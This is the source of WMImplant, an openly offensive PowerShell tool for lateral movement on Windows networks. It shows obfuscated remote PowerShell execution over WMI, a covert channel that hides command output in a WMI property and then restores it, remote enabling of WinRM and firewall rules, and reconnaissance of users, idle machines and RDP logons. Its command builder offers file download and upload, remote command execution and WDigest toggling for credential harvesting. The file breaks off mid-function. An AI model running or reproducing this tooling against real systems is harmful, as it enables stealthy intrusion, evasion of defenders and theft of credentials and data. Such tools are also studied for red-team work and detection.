#requires -version 2

<#
    WMImplant v1.0
    License: GPLv3
    Author: @ChrisTruncer
#>

function Invoke-WMIObfuscatedPSCommand
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $True)]
        [String]$PSCommand,
        [Parameter(Mandatory = $True)]
        [String]$Target,
        [Parameter(Mandatory = $False)]
        [Switch]$ObfuscateWithEnvVar
    )

    Process
    {
        # Generate randomized and obfuscated syntax for retrieving PowerShell command from an environment variable if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            # Create random alphanumeric environment variable name.
            $VarName = -join (Get-Random -Input ((((65..90) + (97..122) | % {[char]$_})) + (0..9)) -Count 5)

            # Randomly select obfuscated syntax for invoking the contents of the randomly-named environment variable.
            # More complete obfuscation options can be imported from Invoke-Obfuscation.
            $DGGetChildItemSyntaxRandom = Get-Random -Input @('Get-C`hildItem','Child`Item','G`CI','DI`R','L`S')
            $DGGetCommandSyntaxRandom   = Get-Random -Input @('Get-C`ommand','Co`mmand','G`CM')
            $DGInvokeSyntaxRandom       = Get-Random -Input @('IE`X','Inv`oke-Ex`pression',".($DGGetCommandSyntaxRandom ('{1}e{0}'-f'x','i'))")
        
            $DGEnvVarSyntax       = @()
            $DGEnvVarSyntax      += "(" + $DGGetChildItemSyntaxRandom + " env:$VarName).Value"
            $DGEnvVarSyntax      += "`$env:$VarName"
            $DGEnvVarSyntaxRandom = (Get-Random -Input $DGEnvVarSyntax)

            $DGInvokeEnvVarSyntax       = @()
            $DGInvokeEnvVarSyntax      += $DGInvokeSyntaxRandom + ' ' + $DGEnvVarSyntaxRandom
            $DGInvokeEnvVarSyntax      += $DGEnvVarSyntaxRandom + '|' + $DGInvokeSyntaxRandom
            $DGInvokeEnvVarSyntaxRandom = (Get-Random -Input $DGInvokeEnvVarSyntax)

            $PSCommandForCommandLine = $DGInvokeEnvVarSyntaxRandom
        }
        Else
        {
            $PSCommandForCommandLine = $PSCommand
        }

        # Set final PowerShell command to be executed by WMI.
        $ObfuscatedCommand = "powershell $PSCommandForCommandLine"

        # Extract username if $Creds were specified. Otherwise use current username.
        if($Creds)
        {
            $Username = $Creds.UserName
        }
        else
        {
            $Username = $env:USERNAME
        }

        # Set PowerShell command in an environment variable if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            if($Creds)
            {
                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $Target -Credential $Creds
            }
            else
            {
                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $Target
            }
        }

        # Launch PowerShell command.
        if($Creds)
        {
            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Creds -ComputerName $Target
        }
        else
        {
            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $Target
        }

        # Delete environment variable containing PowerShell command if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            if($Creds)
            {
                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $Target -Credential $Creds | Remove-WmiObject
            }
            else
            {
                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $Target | Remove-WmiObject
            }
        }

        <#DELETE BELOW BLOCK FOR FINAL RELEASE#>
        $ShowFunFactsForPOV = $False
        if($ShowFunFactsForPOV -AND $ObfuscateWithEnvVar)
        {
            Write-Host "`n`nHere's what just happened:" -ForegroundColor White
            Write-Host "Random env var NAME :: " -NoNewLine -ForegroundColor White
            Write-Host $VarName -ForegroundColor Cyan
            Write-Host "Env var VALUE       :: " -NoNewLine -ForegroundColor White
            Write-Host $PSCommand -ForegroundColor Cyan
            Write-Host "PS cmdline launcher :: " -NoNewLine -ForegroundColor White
            Write-Host $ObfuscatedCommand -ForegroundColor Green
        }
        <#DELETE ABOVE BLOCK FOR FINAL RELEASE#>

    } # End of Process Block
    end{}
} # End of Function block


function Disable-WinRMWMI
{
    # This and the coupled enable function are no longer actually used, but are included in the event
    # I find a specific usecase for this route in the future
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Begin
    {
        $HKLM = 2147483650
        $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
        $DWORDName = 'AllowAutoConfig' 
        $DWORDvalue = '0x1'
    }

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose 'Attempting to create Remote Key and set value'
        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
        }

        Write-Verbose 'Attempting to stop WinRM'
        (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StopService() | Out-Null
        Start-Sleep -Seconds 10

        # Variables for WinRM Firewall Rule
        $Key = 'SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules'
        $Rule1Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|LPort=5985|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule1Name = 'WINRM-HTTP-In-TCP-PUBLIC'
        $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule2Name = 'WINRM-HTTP-In-TCP'

        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
        }        
    }
}

function Enable-WinRMWMI
{
    # This and the coupled disable function are no longer actually used, but are included in the event
    # I find a specific usecase for this route in the future
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Begin
    {
        $HKLM = 2147483650
        $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
        $DWORDName = 'AllowAutoConfig' 
        $DWORDvalue = '0x1'
    }

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        # This code was found online as separate functions and combined into a single
        # function where appropriate
        # Enabling WinRM Service
        Write-Verbose 'Attempting to create Remote Key and set value'
        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $DWORDName -RegValue 1 -Target $Target -Creds $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $DWORDName -RegValue 1 -Target $Target
        }

        Write-Verbose 'Attempting to start WinRM'
        (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StartService() | Out-Null
        Start-Sleep -Seconds 10

        # Variables for WinRM Firewall Rule
        $Key = 'SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules'
        $Rule1Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|LPort=5985|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule1Name = 'WINRM-HTTP-In-TCP-PUBLIC'
        $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
        $Rule2Name = 'WINRM-HTTP-In-TCP'

        if($Creds)
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule1Name -RegValue $Rule1Value -Target $Target -Creds $Creds
            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule2Name -RegValue $Rule2Value -Target $Target -Creds $Creds
        }
        else 
        {
            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule1Name -RegValue $Rule1Value -Target $Target
            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule2Name -RegValue $Rule2Value -Target $Target
        }

        # Restarting firewall service
        Write-Verbose 'Attempting to stop MpsSvc'
        $null = (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StopService()
        Start-Sleep -Seconds 10
        Write-Verbose 'Attempting to start MpsSvc'
        $null = (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StartService()
        Start-Sleep -Seconds 10
    }
}

function Find-CurrentUsers
{
    # This function list user accounts with active processes
    # on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            $system_process_accounts = Get-WMIObject Win32_Process -Credential $Creds -ComputerName $Target | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
        }
        else
        {
            $system_process_accounts = Get-WMIObject Win32_Process -ComputerName $Target | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
        }

        foreach($user_name in $system_process_accounts) 
        { 
            if((!($user_name -Like "*NT AUTHORITY*")) -and ($user_name -ne '\')) 
            { 
                $user_name
            }
        }
    }
}

function Find-VacantComputer
{
    # This function gathers running processes on the targeted system and tries to find
    # a screensaver or windows login process.  It also attempts to enumerate active accounts
    # on the targeted system through Win32_computersystem
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        # Need to add in filtering here to stop if a "true" has been found for screensavers being active
        Write-Verbose "Connecting to $Target"
        
        Write-Verbose "Checking for active screensaver or logon screen processes"
        if($Creds)
        {
            $all_processes = Get-ProcessListingWMImplant -Creds $Creds -Target $Target
        }
        else
        {
            $all_processes = Get-ProcessListingWMImplant -Target $Target
        }

        $ScreenshotActive = $all_processes | Select-String ".scr"
        $LoginPrompt = $all_processes | Select-String "LogonUI.exe"

        # If either returned true, we can assume the user is not active at their desktop
        if ($ScreenshotActive -or $LoginPrompt)
        {
            Write-Output "Screensaver or Logon screen is active on $Target!"
        }
        else
        {
            Write-Output "User is at present at $Target!"
        }

        try
        {
            if($Creds)
            {
                $user = Get-WmiObject -Class win32_computersystem -ComputerName $Target -Credential $Creds -ErrorAction Stop | select -ExpandProperty username
            }
            else
            {
                $user = Get-WmiObject -Class win32_computersystem -ComputerName $Target -ErrorAction Stop | select -ExpandProperty username
            }
            if($user)
            {
                Write-Output "$user has a session on $Target!"
            }
        }
        catch
        { 
            $message = $_.Exception.Message
            if($message -like '*not process argument because*')
            {
                Write-Output "No users appear active on $Target"
            }
            elseif($message -like '*RPC server is unavailable*')
            {
                Write-Verbose "Cannot connect to $Target"
            }
        }
    }
}

function Get-ComputerDrives
{
    # This function attempts to list local and network drives attached to the
    # targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        $filter = "DriveType = '4' OR DriveType = '3'"

        if($Creds)
        {
            Get-WmiObject -class win32_logicaldisk -ComputerName $Target -Filter $filter -Credential $Creds
        }

        else
        {
            Get-WmiObject -class win32_logicaldisk -ComputerName $Target -Filter $filter
        }
    }
    end{}
}

function Get-HostInfo
{
    # This function attempts to gather basic information about the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if($Creds)
        {
            try
            {
                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $Target -Credential $Creds -ErrorAction Stop
            }
            catch
            {
                Continue
            }
        }

        else
        {
            try
            {
                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $Target -ErrorAction Stop
            }
            catch
            {
                Continue
            }
        }

        if($sys_info.Name)
        {
            $sys_info
        }
    }
    end{}
}

function Get-InstalledPrograms
{
    # This functions retrieves applications that have been installed on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        # Store data in existing WMI property, but keep original value
        if($Creds)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
        }

        Write-Verbose "Running remote command and writing to WMI property"
        $remote_command = '$fct = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string).Trim(); $fctenc=[Int[]][Char[]]$fct -Join '',''; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'

        if($Creds)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Creds)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
            }
            
            try 
            {
                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else 
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Replacing original WMI property value from remote system
        Write-Verbose "Replacing original WMI property value from remote system"

        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()
        
        Write-Verbose "Done!"
    }
    end{}
}

function Get-NetworkCards
{
    # This function is designed to check for actie IPs on remote Systems
    # and print any systems with multiple NICs
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if($Creds)
        {
            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $Target -Credential $Creds
        }
        else
        {
            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $Target
        }

        foreach($nic in $adapters)
        {
            if($nic.IPAddress -ne $null)
            {
                $nic
            }
        }
    }
    end{}
}

function Get-ProcessListingWMImplant
{
    # This function lists all running processes on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)] 
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            Get-WMIObject Win32_Process -Credential $Creds -ComputerName $Target | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
        }
        else
        {
            Get-WMIObject Win32_Process -ComputerName $Target | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
        }
    }
}

function Get-WMIEventLogins
{
<#
.DESCRIPTION
Will get remote login details from event log on remote hosts.
This can be used to find out where people are logging in from or
to find jump boxes.

.PARAMETER Targets
List of targets. Will accept value from pipe.

.PARAMETER User
Username to connect to remote host

.PARAMETER Pass
Password to connect to remote host

.PARAMETER FileName
Path to save output to
#>
    
    Param
    (
        # Parameter Assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$FileName
    )

    Process {

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            $temp = Get-WmiObject -Credential $Creds -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+10" | Select-String "Logon Process:\s+User32"}
        }

        else
        {
            $temp = Get-WmiObject -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+10" | Select-String "Logon Process:\s+User32"}
        }

        $temp2 = @()
        ForEach ($line in $temp)
        {
            $temp2 = $line.Message -split '[\r\n]' | Select-String -pattern "workstation name:", "account name:", "source network address:"
        }

        $result = $temp2 | Select-String -pattern "workstation name:", "account name:", "source network address:"; 

        $finalResult = @(); 
        For($i=0; $i -lt $result.Count; $i+=4) { 
            $accountName = ([string]($result[$i+1])).Split(":")[1].Trim(); 
            $workstationName = ([string]($result[$i+2])).Split(":")[1].Trim(); 
            $sourceAddress = ([string]($result[$i+3])).Split(":")[1].Trim(); 
            $keyPair = "$accountName,$workstationName,$sourceAddress"; 
            $finalResult += $keyPair 
        }
        Write-Output "User Account, System Connecting To, System Connecting From"
        $finalResult | Sort-Object -Unique

        if($FileName)
        {
            $temp | Out-File -Encoding ASCII -FilePath $FileName
        }
    }
}

function Invoke-CommandExecution
{
    # This function allows you to run a command-line command on the targeted system and
    # receive its output
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$ExecCommand
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$ExecCommand)
        {
            $ExecCommand = Read-Host "Please provide the command you'd like to run >"
        }

        # Get original WMI Property
        if($Creds)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
        }

        Write-Verbose "Building PowerShell command"

        $remote_command = '$output = '
        $remote_command += "($ExecCommand | Out-String).Trim();"
        $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
        $remote_command += ' $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'

        Write-Verbose "Running command on remote system..."

        if($Creds)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Creds)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
            }
            
            try 
            {
                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else 
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Replacing WMI Property
        Write-Verbose "Replacing WMI Property"

        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()

        Write-Verbose "Done!"
    }
}

function Invoke-CommandGeneration
{
    # This function generates the command line command users would run to invoke WMImplant
    # in a non-interactive manner
    Show-WMImplantMainMenu

    # Read in user's menu choice
    $GenSelection = Read-Host "What is the command you'd like to run? >"
    $GenSelection = $GenSelection.Trim().ToLower()

    $GenTarget = Read-Host "What system are you targeting? >"
    $GenTarget = $GenTarget.Trim()

    $AnyCreds = Read-Host "Do you want to run this in the context of a different user? [yes] or [no]? >"
    $AnyCreds = $AnyCreds.Trim().ToLower()

    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
    {
        # Query user for user account and password to use
        $GenUsername = Read-Host "Please provide the domain\username to use for authentication >"
        $GenPassword = Read-Host "Please provide the password to use for authentication >"
    }

    switch ($GenSelection)
    {
        "change_user"
        {
            Throw "This really isn't applicable unless you are using WMImplant interactively."
        }

        "exit"
        {
            Throw "This command isn't applicable unless using WMImplant interactively"
        }

        "gen_cli"
        {
            Throw "You are already generating a command!"
        }

        "set_default"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -SetWMIDefault -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }
            else
            {
                $Command = "`nInvoke-WMImplant -SetWMIDefault -Target $GenTarget`n"
            }
            $Command
        }

        "help"
        {
            Throw "You are already looking at the help menu!"
        }

        "cat"
        {
            $FileRead = Read-Host "What's the full path to the file you'd like to read? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -Cat -Target $GenTarget -RemoteFile $FileRead -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -Cat -Target $GenTarget -RemoteFile $FileRead`n"
            }
            $Command
        }

        "download"
        {
            # Determine which file you want to download, and where to save it
            $GenDownload = Read-Host "What is the full path to the file you want to download? >"
            $GenSavePath = Read-Host "What is the full path to where you'd like to save the file? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -Download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -Download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget`n"
            }
            $Command
        }

        "ls"
        {
            $DirLs = Read-Host "What is the full path to the directory you want to list? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -LS -RemoteDirectory $DirLs -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -LS -RemoteDirectory $DirLs -Target $GenTarget`n"
            }
            $Command
        }

        "search"
        {
            $SearchBy = Read-Host "Do you want to search for a file [extension] or [name]? >"
            $SearchBy = $SearchBy.Trim().ToLower()
            $SearchDrive = Read-Host "What drive do you want to search? Ex C: >"
            $SearchDrive = $SearchDrive.Trim().ToLower()

            if($SearchBy -eq "extension")
            {
                $SearchExt = Read-Host "What is the file extension you are looking for? >"
                $SearchExt = $SearchExt.Trim().ToLower()

                if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                {
                    $Command = "`nInvoke-WMImplant -Search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                }

                else
                {
                    $Command = "`nInvoke-WMImplant -Search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget`n"
                }
            }
            else
            {
                $SearchFile = Read-Host "What is the file name you are looking for? >"
                $SearchFile = $SearchFile.Trim().ToLower()

                if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                {
                    $Command = "`nInvoke-WMImplant -Search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                }

                else
                {
                    $Command = "`nInvoke-WMImplant -Search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget`n"
                }
            }
            $Command
        }

        "upload"
        {
            $FileToUpload = Read-Host "Please provide the full path to the local file you want to upload >"
            $UploadLocation = Read-Host "Please provide the full path to the location you'd like to upload the file >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -Upload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -Upload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
            }
            $Command
        }

        "command_exec"
        {
            $GenCommandExec = Read-Host "What command do you want to run on the remote system? >"
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -CommandExec -RemoteCommand $GenCommandExec -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }
            else
            {
                $Command = "`nInvoke-WMImplant -CommandExec -RemoteCommand $GenCommandExec -Target $GenTarget`n"
            }
            $Command
        }

        "disable_wdigest"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -DisableWdigest -KeyDelete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }
            else
            {
                $Command = "`nInvoke-WMImplant -DisableWdigest -KeyDelete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $GenTarget`n"
            }
            $Command
        }

        "disable_winrm"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -DisableWinRM -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }
            else
            {
                $Command = "`nInvoke-WMImplant -DisableWinRM -Target $GenTarget`n"
            }
            $Command
        }

        "enable_wdigest"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -EnableWdigest -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }
            else
            {
                $Command = "`nInvoke-WMImplant -EnableWdigest -Target $GenTarget`n"
            }
            $Command
        }

        "enable_winrm"
        {
            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -EnableWinRM -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }
            else
            {
                $Command = "`nInvoke-WMImplant -EnableWinRM -Target $GenTarget`n"
            }
            $Command
        }

        "registry_mod"
        {
            $GenRegMethod = Read-Host "Do you want to [create] or [delete] a string registry value? >"
            $GenRegMethod = $GenRegMethod.Trim().ToLower()
            $GenRegHive = Read-Host "What hive would you like to modify? Ex: hklm >"
